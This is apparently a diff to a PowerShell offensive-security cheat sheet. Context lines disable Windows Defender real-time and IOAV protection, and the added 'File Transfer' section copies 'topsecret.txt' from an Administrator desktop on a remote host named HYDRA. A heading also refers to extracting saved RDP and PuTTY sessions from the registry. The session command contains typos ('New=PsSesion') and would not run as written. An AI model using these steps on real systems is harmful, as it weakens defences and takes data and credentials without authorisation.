@@ -696,7 +696,11 @@ foreach ($computer in $computers) { (Get-WmiObject Win32_ComputerSystem -Compute
 Set-MpPreference -DisableIOAVProtection $true
 Set-MpPreference -DisableRealtimeMonitoring $true
 ```
-
+# File Transfer
+```
+$ses = New=PsSesion -ComputerName HYDRA
+Copy-Item -FromSession $ses -Path  C:\Users\Administrator\Desktop\topsecret.txt
+```
 # Other
 Extract RDP, Putty sessions form Registry:
 
